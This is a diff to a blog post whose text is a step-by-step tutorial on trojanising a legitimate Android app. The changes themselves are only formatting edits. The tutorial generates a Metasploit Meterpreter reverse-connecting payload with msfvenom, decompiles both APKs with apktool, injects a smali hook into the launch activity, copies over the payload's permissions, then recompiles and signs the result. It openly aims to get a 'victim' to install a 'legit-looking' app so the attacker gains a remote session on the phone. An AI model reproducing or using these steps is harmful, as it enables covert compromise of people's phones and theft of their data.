@@ -9,7 +9,7 @@ tags:
   - Metasploit
 ---
 
-Metasploit's flagship product, the _Meterpreter_, is very powerful and an all–purpose payload. Once installed on the victim machine, we can do whatever we want to their system by sending out commands to it. For example, we could grab sensitive data out of the compromised system.
+Metasploit's flagship product, the _Meterpreter_, is very powerful and an all-purpose payload. Once installed on the victim machine, we can do whatever we want to their system by sending out commands to it. For example, we could grab sensitive data out of the compromised system.
 
 The Meterpreter payload also comes as an installable .apk file for Android systems. Great! Now we can use Metasploit to compromise Android phones also. But if you have tried out these payloads you would know that they do not look convincing. No one in their right mind is going to install and run such an app, which apparently does nothing when it is opened. So how are we going to make the victim run the payload app in their phone?
 
@@ -36,14 +36,14 @@ Also download the apk which you want to be backdoored from any source you like. 
 
 ### Brief Overview
 
-Since this tutorial is a little bit long, I’m giving a brief overview of what we are going to do here —
+Since this tutorial is a little bit long, I’m giving a brief overview of what we are going to do here,
  	
 1. Generate the Meterpreter payload.
 2. Decompile the payload and the original apk.
 3. Copy the payload files to the original apk.
 4. Inject the hook into the appropriate activity of the original apk.
-5. Inject the permissions in the AndroidManifest.xml file.
-6. Re–compile the original apk.
+5. Inject the permissions in the `AndroidManifest.xml` file.
+6. Recompile the original apk.
 7. Sign the apk using Jarsigner.
 
 
@@ -54,32 +54,32 @@ That’s about it. I will also show you how can you get a working Meterpreter se
 
 First of all, we have to make the Meterpreter payload. We are going to use _MSFVenom_ for this. The command is —
 ```console
-$ msfvenom -p android/meterpreter/[payload_type] LHOST=[IP_address] LPORT=[incoming_port] -o meterpreter.apk
+$ msfvenom -p android/meterpreter/payload_type LHOST=ip_address LPORT=incoming_port -o meterpreter.apk
 ```
 
-Replace [payload_type] by any of the following payloads available. The function of all these payloads are same, essentially they are all Meterpreter payloads, the difference is only in the method they use to connect to your Kali system. The available [payload_type]s are —
+Replace `payload_type` by any of the following payloads available. The function of all these payloads are same, essentially they are all Meterpreter payloads, the difference is only in the method they use to connect to your Kali system. The available `payload_type`s are
 
 - _reverse_tcp_
 - _reverse_http_
 - _reverse_https_
 
-You can use any one you like, I'm going to use _reverse_https_ as an example.
+You can use any one you like, I'm going to use `reverse_https` as an example.
 
-Replace [IP_address] by the IP address to which the payload is going to connect back to, i.e the IP address of the attacker's system. If you are going to perform this attack over a local network (eg. if the victim and attacker are connected to the same Wi-Fi hotspot), your Local IP will suffice. To know what your local IP is, run the command —
+Replace `ip_address` by the IP address to which the payload is going to connect back to, i.e. the IP address of the attacker's system. If you are going to perform this attack over a local network (eg. if the victim and attacker are connected to the same Wi-Fi hotspot), your Local IP will suffice. To know what your local IP is, run the command —
 ```console
 $ ifconfig
 ```
-![Screenshot from 2015-12-18 13:56:49](/images/posts/screenshot-from-2015-12-18-135649.png)
+![Screenshot from 2015-12-18 13:56:49](/images/posts/metasploit-apk-manually-screenshot-from-2015-12-18-135649.png)
 
 
 If you are going to perform this attack over the Internet, you have to use your public IP address, and configure your router properly—set up port forwarding—so that your system is accessible from the Internet. To know your public IP, just google “My IP” and Google will help you out.
 
-Replace [incoming_port] with the port no. which you want to be used by the payload to connect to your system. This can be any valid port except the reserved ones like port 80 (HTTP). I’m going to use 4895 as an example.
+Replace `incoming_port` with the port no. which you want to be used by the payload to connect to your system. This can be any valid port except the reserved ones like port 80 (HTTP). I’m going to use 4895 as an example.
 
 
 So run the command using replacing the keywords with appropriate values and MSFVenom will generate a payload `meterpreter.apk` in the root directory. Note that we specified the output file name using the `-o meterpreter.apk` argument in the command, so if you like, you can name it anything else also.
 
-![Screenshot from 2015-12-18 14:23:14](/images/posts/screenshot-from-2015-12-18-142314.png)
+![Screenshot from 2015-12-18 14:23:14](/images/posts/metasploit-apk-manually-screenshot-from-2015-12-18-142314.png)
 
 
 ### Step 2: Decompile the APKs
@@ -87,11 +87,11 @@ So run the command using replacing the keywords with appropriate values and MSFV
 Now we have to decompile the APKs, for this we are going to use ApkTool. It decompiles the code to a fairly human-readable format and saves it in `.smali` files, and also successfully extracts the _.xml_ files. Assuming you have already installed the latest _apktool_ and also have the original apk file in the root directory, run the following commands —
 ```console
 $ apktool d -f -o payload /root/meterpreter.apk
-$ apktool d -f -o original /root/[original_apk_name] 
+$ apktool d -f -o original /root/original_apk_name 
 ```
 It will decompile the payload to `/root/payload` and the original apk to `/root/original` directory.
 
-![Screenshot from 2015-12-19 01:30:26](/images/posts/screenshot-from-2015-12-19-013026.png)
+![Screenshot from 2015-12-19 01:30:26](/images/posts/metasploit-apk-manually-screenshot-from-2015-12-19-013026.png)
 
 
 ### Step 3: Copy the Payload Files
@@ -105,7 +105,7 @@ In the previous step, we just copied the payload codes inside the original apk, 
 
 For this, firstly we have to find out which activity (to put it simply, activities are sections of code, it’s similar to frames in windows programming) is run when the app is launched. We can get this info from the `AndroidManifest.xml` file.
 
-So open up the AndroidManifest.xml file located inside the _/root/original_ folder using any text editor. If you know HTML, then this file will look familiar to you. Both of them are essentially Markup Languages, and both use the familiar tags and attributes structure, e.g. `<tag attribute="value">Content</tag>`. Anyway, look for an `<activity>` tag which contains both the lines
+So open up the `AndroidManifest.xml` file located inside the _/root/original_ folder using any text editor. If you know HTML, then this file will look familiar to you. Both of them are essentially Markup Languages, and both use the familiar tags and attributes structure, e.g. `<tag attribute="value">Content</tag>`. Anyway, look for an `<activity>` tag which contains both the lines
 
 ```    
 <action android:name="android.intent.action.MAIN"/>
@@ -114,18 +114,18 @@ So open up the AndroidManifest.xml file located inside the _/root/original_ fold
 
 On a side note, you can use CTRL+F to search within the document in any GUI text editor. When you locate that activity, note its `android:name` attribute's value. In my case, as you can see from the screenshot below, it is `com.piriform.ccleaner.ui.activity.MainActivity`.
 
-![Screenshot from 2015-12-19 13:21:32](/images/posts/screenshot-from-2015-12-19-132132.png)
+![Screenshot from 2015-12-19 13:21:32](/images/posts/metasploit-apk-manually-screenshot-from-2015-12-19-132132.png)
 
 Those two lines we searched for signifies that this is the activity which is going to start when we launch the app from the launcher icon, and also this is a MAIN activity (similar to the _main_ function in traditional programming).
 
 Now that we have the name of the activity we want to inject the hook into, let's get to it! First of all, open the .smali code of that activity using _gedit_. Just open a terminal and type —
 ```console
-$ gedit /root/original/smali/[activity_path]
+$ gedit /root/original/smali/activity_path
 ```
 
-Replace the [activity_path] with the activity's `android:name`, but instead of the dots, type slash. Actually the smali codes are stored in folders named in the format the `android:name` is in, so we can easily get the location of the .smali code in the way we did. Check the screenshot below and you will get an idea of what I'm trying to say.
+Replace the `activity_path` with the activity's `android:name`, but instead of the dots, type slash. Actually the smali codes are stored in folders named in the format the `android:name` is in, so we can easily get the location of the .smali code in the way we did. Check the screenshot below and you will get an idea of what I'm trying to say.
 
-![Screenshot from 2015-12-19 19:06:17](/images/posts/screenshot-from-2015-12-19-190617.png)
+![Screenshot from 2015-12-19 19:06:17](/images/posts/metasploit-apk-manually-screenshot-from-2015-12-19-190617.png)
 
 Now search for the following line in the smali code (using CTRL+F) —
 ```
@@ -152,10 +152,10 @@ If we do not mention all the additional permissions that our payload is going to
 These permissions are also listed in the previously encountered AndroidManifest file. So let's open the AndroidManifest.xml of both the original app and the payload from the respective folders. The permissions are mentioned inside `<uses-permission>` tag as an attribute `android:name`. Copy the additional permission lines from the Payload's AndroidManifest to the original app's one. But be careful that there should not be any duplicate.
 
 Here's my original app's AndroidManifest before editing —
-![Screenshot from 2015-12-19 19:37:12](/images/posts/screenshot-from-2015-12-19-193712.png)
+![Screenshot from 2015-12-19 19:37:12](/images/posts/metasploit-apk-manually-screenshot-from-2015-12-19-193712.png)
 
 After adding the additional ones from the Payload's AndroidManifest, my `/root/original/AndroidManifest.xml` looks like this —
-![Screenshot from 2015-12-19 19:42:48](/images/posts/screenshot-from-2015-12-19-194248.png)
+![Screenshot from 2015-12-19 19:42:48](/images/posts/metasploit-apk-manually-screenshot-from-2015-12-19-194248.png)
 
 
 ### Step 6: Recompile The Original APK
@@ -166,7 +166,7 @@ Now the hard parts are all done! We just have to recompile the backdoored app in
 $ apktool b /root/original
 ```
 
-![Screenshot from 2015-12-19 20:14:31](/images/posts/screenshot-from-2015-12-19-201431.png)
+![Screenshot from 2015-12-19 20:14:31](/images/posts/metasploit-apk-manually-screenshot-from-2015-12-19-201431.png)
 
 You will now have the compiled apk inside the `/root/original/dist` directory. But, we're still not done yet.
 
@@ -175,23 +175,23 @@ You will now have the compiled apk inside the `/root/original/dist` directory. B
 
 
 This is also a very important step, as in most of the cases, an unsigned apk cannot be installed. From developer.android.com —
-    
+​    
 > Android requires that all apps be digitally signed with a certificate before they can be installed. Android uses this certificate to identify the author of an app, and the certificate does not need to be signed by a certificate authority. Android apps often use self-signed certificates. The app developer holds the certificate's private key.
 
 In this case we are going to sign the apk using the default android debug key. Just run the following command
 
 ```console
-$ jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA [apk_path] androiddebugkey
+$ jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA apk_path androiddebugkey
 ```
 
-Be sure to replace the [apk_path] in the above command with the path to your backdoored apk file.
+Be sure to replace the `apk_path` in the above command with the path to your backdoored apk file.
 
-![Screenshot from 2015-12-19 20:28:31](/images/posts/screenshot-from-2015-12-19-202831.png)
+![Screenshot from 2015-12-19 20:28:31](/images/posts/metasploit-apk-manually-screenshot-from-2015-12-19-202831.png)
 
 
 ### PROFIT?!
 
 Now if you can get the victim to install and run this very legit-looking app in his phone, you can get a working Meterpreter session on his phone!
 
-![Screenshot from 2015-12-19 20:44:01](/images/posts/screenshot-from-2015-12-19-204401.png)
+![Screenshot from 2015-12-19 20:44:01](/images/posts/metasploit-apk-manually-screenshot-from-2015-12-19-204401.png)
 
